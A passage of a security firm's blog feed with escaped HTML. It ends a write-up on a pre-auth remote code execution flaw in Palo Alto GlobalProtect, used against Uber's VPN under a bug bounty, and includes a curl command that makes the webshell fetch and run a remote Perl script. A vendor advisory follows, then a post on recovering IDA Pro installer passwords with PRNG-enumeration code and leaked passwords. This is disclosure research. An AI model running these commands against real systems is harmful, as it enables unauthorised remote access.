&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the modification is done, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; becomes our webshell and we can execute commands via:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=curl orange.tw/bc.pl | perl -&apos;&lt;/span&gt; https://global-protect/sslmgr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We have reported this bug to Palo Alto via the &lt;a href=&quot;https://securityadvisories.paloaltonetworks.com/Report&quot;&gt;report form&lt;/a&gt;. However, we got the following reply:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hello Orange,&lt;/p&gt;

  &lt;p&gt;Thanks for the submission. Palo Alto Networks does follow coordinated vulnerability disclosure for security vulnerabilities that are reported to us by external researchers. We do not CVE items found internally and fixed. This issue was previously fixed, but if you find something in a current version, please let us know.&lt;/p&gt;

  &lt;p&gt;Kind regards&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hmmm, so it seems this vulnerability is known for Palo Alto, but not ready for the world!&lt;/p&gt;

&lt;h2 id=&quot;the-case-study&quot;&gt;The case study&lt;/h2&gt;

&lt;p&gt;After we awared this is not a 0day, we surveyed all Palo Alto SSL VPN over the world to see if there is any large corporations using the vulnerable GlobalProtect, and Uber is one of them! From our survey, Uber owns about 22 servers running the GlobalProtect around the world, here we take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vpn.awscorp.uberinternal.com&lt;/code&gt; as an example!&lt;/p&gt;

&lt;p&gt;From the domain name, we guess Uber uses the BYOL from &lt;a href=&quot;https://aws.amazon.com/marketplace/pp/B00OC1T2D4?qid=1562269885823&amp;amp;sr=0-1&amp;amp;ref_=srh_res_product_title&quot;&gt;AWS Marketplace&lt;/a&gt;. From the login page, it seems Uber uses the 8.x version, and we can target the possible target version from the supported version list on the Marketplace overview page:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;8.0.3&lt;/li&gt;
  &lt;li&gt;8.0.6&lt;/li&gt;
  &lt;li&gt;8.0.8&lt;/li&gt;
  &lt;li&gt;8.0.9&lt;/li&gt;
  &lt;li&gt;8.1.0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, we figured out the version, it’s 8.0.6 and we got the shell back!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190717/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uber took a very quick response and right step to fix the vulnerability and Uber gave us a detail explanation to the bounty decision:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hey @orange — we wanted to provide a little more context on the decision for this bounty. During our internal investigation, we found that the Palo Alto SSL VPN is not the same as the primary VPN which is used by the majority of our employees.&lt;/p&gt;

  &lt;p&gt;Additionally, we hosted the Palo Alto SSL VPN in AWS as opposed to our core infrastructure; as such, this would not have been able to access any of our internal infrastructure or core services. For these reasons, we determined that while it was an unauthenticated RCE, the overall impact and positional advantage of this was low. Thanks again for an awesome report!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It’s a fair decision. It’s always a great time communicating with Uber and report to their &lt;a href=&quot;https://hackerone.com/uber&quot;&gt;bug bounty program&lt;/a&gt;. We don’t care about the bounty that much, because we enjoy the whole research process and feeding back to the security community! Nothing can be better than this!&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/</link>
                <guid>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Palo Alto GlobalProtect 資安通報</title>
                <description>&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;

&lt;p&gt;在我們進行&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練&lt;/a&gt;的過程中，發現目標使用的 Palo Alto GlobalProtect 存在 format string 弱點，透過此弱點可控制該 SSL VPN 伺服器，並藉此進入企業內網。&lt;/p&gt;

&lt;p&gt;回報原廠後，得知這是個已知弱點並且已經 silent-fix 了，所以並未有 CVE 編號。經過我們分析，存在風險的版本如下，建議用戶儘速更新至最新版以避免遭受攻擊。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;9.x 和 7.0.x 並沒有存在風險。&lt;/p&gt;

&lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;

&lt;p&gt;我們也利用了這個弱點成功控制了 Uber 的 VPN 伺服器，詳細的技術細節請參閱我們的 Advisory：
&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;這將會是我們 SSL VPN 研究的系列文，預計會有三篇。這也是我們研究團隊今年在 &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; 和 &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; 的演講『 &lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt; 』中的一小部分，敬請期待！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/</link>
                <guid>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>破密行動: 以不尋常的角度破解 IDA Pro 偽隨機數</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;Hex-Rays IDA Pro 是目前世界上最知名的反組譯工具，今天我們想來聊聊它的安裝密碼。什麼是安裝密碼？一般來說，在完成 IDA Pro 購買流程後，會收到一個客製化安裝檔及安裝密碼，在程式安裝過程中，會需要那組安裝密碼才得以繼續安裝。那麼，如果今天在網路上發現一包洩漏的 IDA Pro 安裝檔，我們有可能在不知道密碼的狀況下順利安裝嗎？這是一個有趣的開放性問題。&lt;/p&gt;

&lt;p&gt;在我們團隊成員腦力激盪下，給出了一個驗證性的答案：是的，在有 Linux 或 MacOS 版安裝檔的狀況下，我們可以直接找到正確的安裝密碼；而在有 Windows 版安裝檔的狀況下，我們只需要十分鐘就可算出安裝密碼。&lt;/p&gt;

&lt;p&gt;下面就是我們的驗證流程：&lt;/p&gt;

&lt;h3 id=&quot;-linux-以及-macos-版&quot;&gt;* Linux 以及 MacOS 版&lt;/h3&gt;

&lt;p&gt;最先驗證成功的是 Linux 及 MacOS 版，這兩個版本都是透過 InstallBuilder 封裝成安裝檔。我們嘗試執行安裝程式，並在記憶體中直接發現了未加密的安裝密碼。任務達成！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在透過 Hex-Rays 協助回報後，&lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; 也在 2019/02/11 釋出了 InstallBuilder 19.2.0，加強了安裝密碼的保護。&lt;/p&gt;

&lt;h3 id=&quot;-windows-版&quot;&gt;* Windows 版&lt;/h3&gt;

&lt;p&gt;在 Windows 版上解決這個問題是項挑戰，因為這個安裝檔是透過 &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt; 封裝的，其安裝密碼是採用 &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt; 的方式儲存，因此我們無法透過靜態、動態程式分析直接取得密碼，透過暴力列舉也不是一個有效率的方式。不過，如果我們掌握了產生密碼的方式，那結果可能就不一樣了，我們也許可以更有效率的窮舉。&lt;/p&gt;

&lt;p&gt;雖然我們已經有了方向是要找出 Hex-Rays 如何產生密碼，但要去驗證卻是”非常困難”的。因為我們不知道亂數產生器是用什麼語言實作的，而目前已知至少有 &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 種亂數產生器&lt;/a&gt;，種類太多了。同時，我們也無法知道亂數產生器所使用的字元組和字元順序是什麼。&lt;/p&gt;

&lt;p&gt;要找出亂數產生器所使用的字元組是眾多困難事中比較簡單的一件，首先，我們竭盡所能的收集所有 IDA Pro 的安裝密碼，例如 WikiLeaks 所揭露的 hackingteam 使用之密碼：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;從所有收集到的安裝密碼中我們整理出所用到的字元組：
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;少了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; 字元，推測這些都是容易混淆的字元，因此不放入密碼字元組中是合理的。接著，我們用這些字元組，猜測可能的排列順序：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最後，我們挑選幾個比較常見的語言（c/php/python/perl）並使用上述的字元組實作亂數產生器，列舉所有亂數組合，看看我們收集到的安裝密碼有沒有出現在這些組合中。例如我們用下面程式碼列舉 C 語言的亂數組合：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
